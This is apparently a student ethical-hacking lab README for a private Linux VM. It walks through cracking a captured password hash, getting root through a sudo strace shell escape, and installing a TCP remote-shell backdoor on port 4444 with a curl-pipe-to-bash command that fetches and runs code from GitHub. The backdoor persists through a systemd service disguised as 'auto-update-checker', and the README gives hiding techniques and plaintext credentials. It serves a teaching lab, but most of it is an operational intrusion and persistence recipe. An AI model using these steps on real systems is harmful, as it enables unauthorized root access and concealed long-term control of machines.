# Command and Control
An ethical hacking lab to enter a linux virtual machine, find a privilege escalation vulnerability, and set up a backdoor as the root user. 

## Instructions
### Logging into the week4 machine:
ssh into the week4 virtual machine (private VM not publically accessible) using this command:
`ssh user@10.0.2.5`

The password for the machine is:
`hill`
 
 <em>[How the password was discovered](#Password-Crack)</em>

To escalate privileges use this command:
```bash
sudo strace -o /dev/null /bin/bash
 ```
then type `cd` in order to change into the root directory.

<em>[How the privilege escalation was discovered](#Privilege-Escalation)</em>

### Installing and running the server script on the week4 machine:
Run the following command which will install the backdoor to the machine. Only 2 files will be installed: the script to run the server from GitHub directly, and the systemd service to ensure persistence (explained further in a later section).

```bash
curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/install_backdoor | bash
```

Installing and running the client script on your local machine:
In any spot on the attacking machine add the file:

<kbd>[client.py](https://github.com/athulnair02/command-and-control/blob/main/client.py)</kbd>

Once you’ve done this, you can run the client script at any time using:
`python client.py` or `python3 client.py`

## How the backdoor works:
### How our backdoor addresses the 5 requirements:
1. **Explanation of how our backdoor provides remote shell access:**
The backdoor is essentially a shell in which the target machine reveals port `4444/tcp` in the firewall and listens for a connection from the network. The python script on the target side is waiting for a connection, and once accepted and authorized through a password, it receives commands from the attacking machine through TCP and executes them through a subprocess. The output from the command is sent back to the attacking machine through the established connection.
2. **Persistence:**
The backdoor maintains persistence using a systemd service that ensures it is always running on the machine. It is the service that initially starts the script to open the backdoor when it is first installed and every time the script ends (either successful, on error, etc.) it will be restarted with a different PID. This way, if there is any unforeseen error in the code, it will not prevent the backdoor from being closed. In addition, if a sysadmin kills the program when finding it suspicious (while looking at top or task manager), it will start again, opening the backdoor once again. Another persistence action taken was having a timeout for the initial backdoor connection. If the backdoor does not have a connection in two minutes, it throws an error and ends the program so that it restarts and ensures the firewall was not closed by the sysadmin. If the firewall is closed, then no connection can be made to the backdoor. This timeout can be changed since the code is directly run off of Github, meaning any push to the main branch will update the backdoor when it is run through the curl command piped into python command.
3. **Configuration to get commands from:**
The only configuration needed is to determine the IP address of the target machine (through `nmap` or any other means) and change `REMOTE_HOST` in `client.py` to that address. It is default set to `10.0.2.5`.
4. **Authentication:**
We created a password `c0d3m@nk3y` and hashed it using `hash(password)` in python. This hash is then stored on the server/target machine. We then have `client.py` ask the user to input a password as the first message to the target and it is then sent to the server. There, the server hashes it and checks it against the known hash, which once confirmed, allows the user remote root shell access.
5. **Hiding from detection:**
There are only 2 files added to the machine: one that is the backdoor, and the other to ensure it keeps running. Both files are using a less suspecting name `auto-update-checker` that creates the illusion of a routine, ordinary task for the sysadmin. The actual script that is run is in the root’s home directory as a hidden file (it can easily be placed elsewhere more secretive). There is no `cronjob` running so a sysadmin cannot find the script running there (where other common repeating programs may be). In addition, the service is buried deep with other services so it will be difficult for a sysadmin to search through all services to determine which one is malicious.
## How our backdoor can be detected:
If the sysadmin checks the hidden files in the root home directory, they can find the presence of a file they did not put. If they look past the unsuspecting name and read the script that is running, they will find the backdoor. 

If the sysadmin looks at what ports are open on the firewall using `firewall-cmd –list-ports`, they will see that `4444/tcp` is open and will know something odd is in place keeping the port open. If they use further investigation, they may find the program using the port if they install `lsof` and execute `lsof -i:4444`. 

## Password Crack
### Discovery and Researching the Vulnerability
After finding the IP of the target machine as `10.0.2.5`, I looked through the `pcappng` file (saved state file from Wireshark) to see any traffic coming to or from that machine. After following TCP streams here and there, I found a stream with comprehensible data.
![image](https://github.com/athulnair02/command-and-control/assets/42418601/3da19f36-09eb-44ee-b395-50fc5d5765fe)
![image](https://github.com/athulnair02/command-and-control/assets/42418601/413c5d59-f7a7-40f2-8a83-01f342470ce2)
![image](https://github.com/athulnair02/command-and-control/assets/42418601/0547b7f0-8dfe-45d7-9f9d-b263b70399bf)

I noticed that it looked like an HTTP response with information about users. I saw the user `user` had a password hashed next to it and found it to be intriguing and worth looking into.

I then used John the Ripper with the wordlist `rockyou.txt` to brute force the password which I found out to be `hill`.

## Privilege Escalation
I tried to escalate the privilege using linepeas and GTFObins but it was difficult to achieve it at first, but I eventually used the CVE exploit linpeas informed me about and found a GitHub repository with a shell code to run the exploit which escalated me to root.
![image](https://github.com/athulnair02/command-and-control/assets/42418601/32c2380f-6519-4de2-8973-2cae07d6024a)

The second method I used was through a `sudo` command for `strace`. It allowed to spawn an interactive shell unit as root and maintain root access.
![image](https://github.com/athulnair02/command-and-control/assets/42418601/d22cdaae-dd2a-478b-93c1-f3ff8b057d1a)
